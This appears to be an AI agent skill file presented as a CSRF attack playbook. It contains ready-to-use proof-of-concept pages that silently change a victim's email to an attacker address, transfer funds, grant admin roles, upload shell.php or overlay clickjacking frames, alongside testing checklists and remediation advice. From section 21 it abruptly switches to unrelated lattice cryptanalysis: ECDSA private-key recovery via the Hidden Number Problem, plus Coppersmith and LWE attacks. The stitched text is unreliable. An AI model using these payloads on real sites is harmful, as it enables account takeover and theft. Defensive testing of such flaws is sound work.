---
name: csrf-cross-site-request-forgery
description: >-
  CSRF testing playbook. Use when reviewing state-changing web flows, anti-CSRF defenses, SameSite behavior, JSON CSRF, login CSRF, and OAuth state handling.
---

# SKILL: CSRF — Cross-Site Request Forgery — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert CSRF techniques. Covers modern bypass vectors (SameSite gaps, custom header flaws, tokenless bypass patterns), JSON CSRF, multipart CSRF, chaining with XSS. Base models often present only basic CSRF without covering SameSite edge cases and common broken token implementations.

## 0. RELATED ROUTING

Also load:

- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when JSON endpoints become readable cross-origin
- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) when login, account linking, or callback binding relies on OAuth state

---

## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ Check CORS policy: does Access-Control-Allow-Credentials: true appear?
   With wildcard or attacker origin? → exploitable JSON CSRF
□ Check OAuth flows for missing state parameter
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

---

## 18. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the victim session cookie and its `SameSite` / `Secure` / `HttpOnly` attributes, verbatim from `Set-Cookie` | the attribute, not the token, decides whether the request is even sendable cross-site |
| the exact PoC (HTML, JS, or form) as it will be served | a CSRF claim without the artefact is unreproducible |
| the state-changing request with its method, `Content-Type`, `Origin`, and `Referer` | names the boundary that was supposed to stop it |
| the response proving the change **plus a read-back** showing the new value persisted | a `200` on the write is not the finding; the persisted state is |
| the pre-change state captured first | proves a difference actually occurred |
| the anti-CSRF control present on the endpoint and what happened when you removed or swapped it | "no token" and "token present but ignored" are different root causes |
| whether the same request succeeds with a **foreign or empty CSRF token** | separates a missing check from a broken one |
| a **negative control** — a sibling endpoint that correctly rejects the same PoC | proves your harness can detect enforcement |
| browser and version | `SameSite` and Lax+POST behaviour are browser- and version-specific |
| for chained findings, every hop of the chain in order | the CSRF is only as strong as its weakest link |

**The read-back is the finding.** A `302`, a `200`, or an empty body on the write proves
nothing on its own — many frameworks return success-shaped responses for rejected requests and
reject silently with `200`. Re-fetch the object and show the changed value.

**Attribute the bypass to its layer.** "CSRF is possible" is not a report. The fix owner needs
to know *which* control failed: no token issued, token issued but never validated, token
validated against the session but not the user, double-submit compared on a cookie the attacker
can set, `SameSite=None` on a state-changing cookie, method override converting a safe `GET`
into a write, or a CORS policy that let the token be read. Each has a different remediation and
a different owner.

**Severity follows the action and the reachable audience**, not the presence or absence of a
token. A tokenless `POST /profile/theme` is not a finding. A tokenless `POST /account/email`
that rebinds the recovery address is an account takeover.

### False positives — do not report these

| Observation | Why it is not a finding |
|---|---|
| the endpoint is state-changing but idempotent and inconsequential (`/logout`, `/cart/recalculate`) | no meaningful state an attacker gains |
| the session cookie is `SameSite=Strict` and the PoC demonstrably does not send it | the browser blocked it — check the actual request, not the code |
| the request succeeds only from **same-site**, because your PoC ran on a subdomain you control | same-site is not cross-site; verify the registrable domain |
| a `200` with an error body (`{"error":"invalid csrf"}`) | the check fired; read the body, not the status |
| the endpoint requires a custom header the browser cannot set cross-origin and CORS is correctly locked down | the header *is* the control and it holds |
| a token was accepted because you copied the victim's own token from the same session | that is the flow working, not a bypass |
| the "victim" browser had no session cookie at the moment of the test | nothing to ride — re-authenticate and retest |
| a self-XSS-style "PoC" that requires the victim to paste attacker JavaScript into the console | that is XSS, not CSRF, and it is not cross-site |
| `Content-Type` was forced to `application/json` but the server returned `415` | the type check held |
| a JSON CSRF PoC that relies on a CORS preflight the server never approved | the browser never sends the credentialed request |

**Test the control path first.** Send the same PoC against an endpoint that must reject it (a
correctly protected sibling, or the same endpoint with a deliberately invalid token). If your
harness "succeeds" there too, you are observing reflection or a canned response, not a bypass.

---

## 19. REMEDIATION REFERENCE

1. **Make the session cookie the boundary, not the form.** Set `SameSite=Lax` at minimum and
   `Strict` where the flow allows, plus `Secure` and `HttpOnly`. `SameSite` is the only control
   that holds when the endpoint itself has no token, and it survives missing application code.
2. **Validate a per-session, per-user CSRF token on every state-changing request** — and reject
   *before* any side effect. "Token present in the request" is not validation; compare it to the
   value bound to the authenticated session and fail closed on absence, mismatch, or a token
   from a different session.
3. **Bind the token to the session *and* the user, and rotate it on login.** A token that
   survives authentication is a fixation primitive (see §16); a token interchangeable between
   users defeats the control entirely.
4. **Do not rely on the double-submit cookie alone unless the cookie is cryptographically
   signed and unsettable by subdomains** — plain double-submit is defeated by cookie tossing
   from any subdomain or by a sibling-origin XSS. Sign it, or move the comparison server-side.
5. **Reject unsafe methods on state-changing routes.** Do not accept `GET`, `HEAD`, or `OPTIONS`
   for a write, and disable or strictly bound method-override headers (`_method`,
   `X-HTTP-Method-Override`) on those routes — the override converts a SameSite-exempt `GET`
   back into the write you were trying to protect.
6. **Validate `Origin` (and fall back to `Referer`) on state-changing requests**, allowlisting
   exact origins. An absent `Origin` on a browser-initiated cross-site request is itself a signal.
   Never reflect the `Origin` header back as an allowlist (see §15).
7. **Stop accepting `text/plain` or `multipart/form-data` bodies where you parse JSON** — strict
   `Content-Type` matching removes the form-based JSON CSRF trick and forces a preflight the
   attacker's origin will not pass.
8. **Lock down CORS so a token cannot be read cross-origin** — no wildcard with credentials, no
   `Origin` reflection, an exact allowlist. A readable cross-origin response is what turns a
   solid CSRF token into a bypass (§15).
9. **Require re-authentication or a fresh confirmation for the highest-impact actions** —
   email/password change, MFA disable, payout-destination change, key creation. A single
   forged request should never be sufficient for account takeover.
10. **Send `X-Frame-Options: DENY` / CSP `frame-ancestors 'none'`** so clickjacking cannot serve
    as the bypass when tokens are otherwise sound (§17).
11. **Alert on cross-site-shaped state changes** — a state-changing request whose `Origin` is
    absent, foreign, or `null`, or whose `Sec-Fetch-Site` is `cross-site`, is high-signal and
    almost never legitimate.
12. **Regression-test the token in CI** — an automated check that every mutating route rejects a
    missing, foreign, malformed, and stale token catches the reintroduction of tokenless routes
    that tools like a route generator or framework upgrade can silently add.

---

## 20. RELATED SIBLINGS — LOAD TOGETHER
- [cors-cross-origin-misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — when a JSON endpoint becomes *readable* cross-origin, the token leak that completes a JSON CSRF
- [oauth-oidc-misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) — missing or unbound `state`, and callback binding that turns CSRF into account takeover
- [clickjacking](../clickjacking/SKILL.md) — framing as the bypass when CSRF tokens are otherwise sound
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — same-origin token theft that defeats any token scheme
- [graphql-and-hidden-parameters](../graphql-and-hidden-parameters/SKILL.md) — mutations and hidden writable parameters reached without a token
- [business-logic-vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — where a forged request lands on a workflow that assumes an honest client
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — stating the action, the audience, and the persisted effect

---

---

---

## 21. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Did you **calibrate the attack on a synthetic instance** with a planted answer? | the script is correct, not lucky |
| 2 | Did the reduced vector **re-encode to the target's observed value** (a round trip)? | the recovery is exact |
| 3 | Did you run the **same reduction on a random instance** and get noise? | it is not a property of LLL itself |
| 4 | Is the recovered value **structured** once decoded (a key, a message, a coefficient)? | not a wrong basis |
| 5 | Is the **required sample count realistic** for the access you had? | severity and feasibility |
| 6 | Does the recovered secret **unlock the target artefact**? | impact, not a demonstration |
| 7 | Is the lattice dimension and the runtime **within engagement limits**? | reproducibility by the reviewer |

**The random-instance control is the bar for lattice work.** LLL always returns a short vector; without
the control, the output cannot be distinguished from noise, and most published false positives in this
area come from exactly that.

---

## 22. EXECUTION PRIMITIVES

Every attack below **calibrates on a known instance, applies to the target, and verifies**. The
calibration is what separates a lattice recovery from an LLL output.

### 22.1 Environment and the calibration harness

```python
# sage is the practical environment for LLL, BKZ, and fpylll
print("""
sage -python -c "from fpylll import LLL, IntegerMatrix; print('fpylll OK')"
sage -c "print(matrix([[1,2],[3,4]]).LLL())"

Numpy is enough for the toy shapes in this document; fpylll is required for real dimensions.
""")

def calibrate_lattice(build_basis, extract, dim, known, trials=3):
    """Calibrate an attack on instances whose answer we planted.
    build_basis(instance) -> a lattice basis; extract(reduced_basis) -> the candidate secret."""
    import random
    for t in range(trials):
        inst, planted = known(dim)
        B = build_basis(inst)
        try:
            got = extract(B.reduce_LLL() if hasattr(B, "reduce_LLL") else B)
        except Exception as ex:
            print(f"trial {t}: raised {type(ex).__name__}: {ex}"); return False
        if got != planted:
            print(f"trial {t}: MISMATCH got={got!r} planted={planted!r}"); return False
    print(f"calibrated OK over {trials} trials at dimension {dim}")
    return True

print("An attack that cannot recover a value it planted itself proves nothing about the target.")
```

**Calibrate at the target's dimension, not a smaller one.** Lattice attacks have dimension thresholds,
and a script calibrated at dimension 20 routinely fails at dimension 60.

### 22.2 The random-instance control, which is mandatory

```python
def control_random(build_basis, extract, dim, trials=5):
    """Run the identical reduction on random instances. It must return noise, not a value that
    verifies. If it 'succeeds', the extractor is reading structure that is not there."""
    import random
    hits = 0
    for _ in range(trials):
        inst = random_instance(dim)             # same shape, no planted secret
        try:
            out = extract(build_basis(inst))
        except Exception:
            out = None
        if out is not None and verifies(out, inst):
            hits += 1
    print(f"random-instance false positives: {hits}/{trials}")
    print("MUST be 0/5. Anything else means the extractor is pattern-matching noise.")
    return hits == 0

def random_instance(dim):
    raise NotImplementedError("build a random instance of the same shape as the target")

def verifies(out, inst):
    raise NotImplementedError("the same round trip you use on the target")

print("Run control_random BEFORE claiming the target result. It is the only guard against LLL noise.")
```

**Zero false positives on random instances, or the result is noise.** This is the single most important
check in the document, and it is the one most often skipped.

### 22.3 Hidden Number Problem - partial nonce recovery (the classic ECDSA case)

```python
# sage: recover a private key from signatures whose nonces leak some high bits
print("""
sage: N = <curve order>; n_sigs = 40; leak_bits = 8
sage: # build the CVP instance from the signature equations
sage: #   s_i * k_i - r_i * x = h_i  (mod N)
sage: #   k_i = leaked_i * 2^b + unknown_i, with unknown_i < 2^b
sage: B = matrix(ZZ, n_sigs + 2, n_sigs + 2)
sage: #   [ N  0 ... 0  0  0 ]
sage: #   [ 0  N ... 0  0  0 ]
sage: #   [ t_1 t_2 ... t_n 2^(b+1)/N 0 ]
sage: #   [ r_1/N ... r_n/N  0  2^b/N ]
sage: B = B.LLL()
sage: x_candidate = abs(B[1][-1]) * N / 2^(b+1)
sage: assert (x_candidate * G).xy() == known_pubkey_point
""")

def verify_ecdsa_key(x_candidate, secp256k1_G, pub):
    """The round trip for HNP: the candidate private key must produce the target's public key."""
    P = x_candidate * secp256k1_G
    ok = (P == pub)
    print("candidate key reproduces the target public key:", ok)
    return ok

print("The public-key round trip is the verification. A recovered scalar that does not reproduce the")
print("public key is a lattice artefact, and HNP write-ups fail on exactly this point.")
```

**The public-key round trip is mandatory.** An HNP recovery produces a scalar in every case; only the
`x*G == pub` check distinguishes the private key from arithmetic noise.

### 22.4 Coppersmith - small roots of a polynomial mod N

```python
print("""
sage: R.<x> = PolynomialRing(Zmod(N))
sage: f = (KNOWN_PREFIX + x)^e - c        # the polynomial whose small root is the secret
sage: f = f.monic()
sage: roots = f.small_roots(X=2^B, beta=0.5, epsilon=1/30)
sage: assert roots, "no small root found - increase B or lower beta"
sage: m = KNOWN_PREFIX + int(roots[0])
sage: assert pow(m, e, N) == c            # THE ROUND TRIP
""")

def coppersmith_verify(m, e, N, c):
    ok = pow(m, e, N) == c
    print("small root round-trips:", ok)
    return ok

print("Bound selection matters: B too large yields no root, B too small yields a wrong one.")
print("Always sweep B upward and take the first root that round-trips.")
```

**Sweep the bound and take the round-tripping root.** Coppersmith returns the first root in range,
which is not necessarily the right one when `beta` is over-estimated.

### 22.5 LWE / LPN and the embedding technique

```python
print("""
sage: # embedding: put the secret into an extended vector and find it as a short vector
sage: M = matrix(ZZ, m + n + 1, m + n + 1)
sage: #   [ q*I_m   0     0 ]
sage: #   [ A^T     I_n   0 ]
sage: #   [ b^T     0     beta ]
sage: B = M.LLL()
sage: # the short vector with the last coordinate +-beta carries the error, and the secret follows
sage: assert all(abs(e) <= bound for e in recovered_error)
sage: assert (A * recovered_secret) % q == b      # THE ROUND TRIP
""")

def lwe_verify(A, s, q, b):
    ok = tuple((A * matrix(ZZ, s)) % q) == tuple(b)
    print("recovered secret reproduces the samples:", ok)
    return ok

print("Re-encrypt the target's own samples with the recovered secret. That is the verification.")
```

**Reproduce the target's own samples.** An LWE recovery that does not reproduce `A*s = b` is a vector
that happened to be short, not a secret.

### 22.6 NTRU, knapsack, and subset-sum shapes

```python
print("""
Low-density knapsack (Lagarias-Odlyzko):
    sage: # build the basis with the weights c_i and the target sum S, LLL-reduce, and read {0,1}
    sage: bits = [1 if v > 0 else 0 for v in B[0][:n]]
    sage: assert sum(bits[i]*c[i] for i in range(n)) == S    # THE ROUND TRIP

NTRU key recovery:
    sage: # the lattice of the public key carries a very short vector that is the private key
    sage: assert (h * f) % q == g                            # THE ROUND TRIP
""")

def knapsack_verify(bits, c, S):
    ok = sum(bits[i] * c[i] for i in range(len(c))) == S
    print("recovered subset sums to the target:", ok)
    return ok

print("Subset sum verification is trivial and therefore inexcusable to omit.")
```

**Subset-sum verification is one line.** There is no reason for a knapsack finding without it.

### 22.7 The end-to-end lattice workflow

```bash
python3 - <<'PY'
import subprocess
print("STEP 0 - environment")
print("   ", subprocess.run(["bash","-lc","which sage || echo 'sage MISSING (required for LLL/BKZ)'"],
                            capture_output=True, text=True).stdout.strip())
print()
print("STEP 1 - CALIBRATE at the TARGET dimension with a planted answer (3 trials)")
print("     dimension 20 calibration does not transfer to dimension 60")
print()
print("STEP 2 - RANDOM-INSTANCE CONTROL (5 trials, must return 0 false positives)")
print("     this is the guard against LLL returning noise")
print()
print("STEP 3 - APPLY: record the basis, the reduction parameters, and the wall-clock time")
print()
print("STEP 4 - VERIFY: the recovered secret must reproduce the target's own observed value")
print("     ECDSA -> x*G == pub |  LWE -> A*s == b |  knapsack -> sum == S |  NTRU -> h*f == g")
print()
print("STEP 5 - REPORT: dimension, samples, leak size, runtime, the round trip, and the control")
PY
```

**Five steps, and steps 1, 2, and 4 are each individually mandatory.** A lattice finding missing any of
them is not reproducible.

---

## 23. EVIDENCE STANDARD — LATTICE RECOVERY

| Item | Why |
|---|---|
| The **lattice dimension and the construction** (the full basis shape) | the reviewer rebuilds it |
| The **sample count and the leak size** | feasibility and severity |
| The **calibration result at the target dimension** | the code is correct |
| The **random-instance control** with its false-positive count | it is not LLL noise |
| The **round trip** against the target's own value (public key, samples, sum) | the recovery is exact |
| The **reduction algorithm and parameters** (LLL, BKZ block size) | reproducibility |
| The **wall-clock runtime** | engagement feasibility |
| The **recovered secret, redacted**, and the artefact it unlocks | impact |
| Whether the attack needs **more samples than the target exposes** | feasibility, stated honestly |
| Confirmation that no **private key material** is reproduced in full where avoidable | data minimisation |

Report the **recovery and both controls**: "40 ECDSA signatures on secp256k1 exposed the top 8 bits of
each nonce; a 42-dimensional lattice built from the signature equations and LLL-reduced (BKZ-20 on the
tail) recovered a scalar candidate in 3.1 seconds. The candidate satisfies `x*G == pub` for the server's
public key, and signing a test message with it produces a signature the server's verifier accepts, so
the private key is recovered. The same reduction on five random instances of identical shape returned
zero verifiable candidates, and the script was calibrated on a generated instance with a planted key
first", never "the nonces are biased".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A lattice output with **no random-instance control** | LLL always returns a short vector |
| A recovered scalar that does **not reproduce the public key** | arithmetic noise, not the private key |
| A calibrated at dimension 20 applied to dimension 60 **without re-calibration** | the thresholds do not transfer |
| A recovered LWE secret that does **not reproduce `A*s = b`** | a short vector, not a secret |
| A bias with **too few samples to recover** | report the bias as a hardening note, not a recovery |
| A lattice recovery on a **key you generated for the test** | tests your own environment |
| A candidate that verifies **one** equation but not the rest | usually a wrong branch of the reduction |
| A BKZ run that needed **more time than the engagement allowed** | not a practical finding as stated |
| A theoretical bound with **no implementation** | a research note |
| A recovered private key reproduced **in full** in the report | a disclosure |

**Round trip and random-instance control.** Two checks, and a lattice finding without both is not
reproducible - which is the standard the whole package is held to.

---

## 24. REMEDIATION REFERENCE — PARAMETER HARDENING

1. **Generate nonces with a CSPRNG and never a counter or a timestamp in ECDSA or DSA** - the entire HNP family in this document begins with a nonce bias.
2. **Use deterministic nonces (RFC 6979) so a nonce cannot leak through an RNG failure** - it removes the bias class rather than reducing it.
3. **Use a vetted library for lattice-hard and code-based PQC schemes, and never a research implementation in production** - parameter selection is where these schemes fail.
4. **Prefer schemes with tight, standardised parameter sets (ML-KEM, ML-DSA) and follow the parameter guidance exactly** - the attacks here target parameters chosen below the security target.
5. **Never reuse a nonce across two signatures, and enforce that with a hardware or library check** - nonce reuse is an immediate full-key recovery, and it is a single comparison to detect.
6. **Do not expose more leakage than necessary in a protocol** (fewer bits, fewer samples, no timing side channel) - every attack here needs the leak, and the fix is often to not leak.
7. **Remove timing and cache side channels in the scalar multiplication and the modular reduction** - the lattice side of a side-channel attack is only as good as the leak.
8. **Bind the public key into the transcript and validate it (curve membership, subgroup order)** - it removes invalid-curve scalar recovery that leaks the same secrets as HNP.
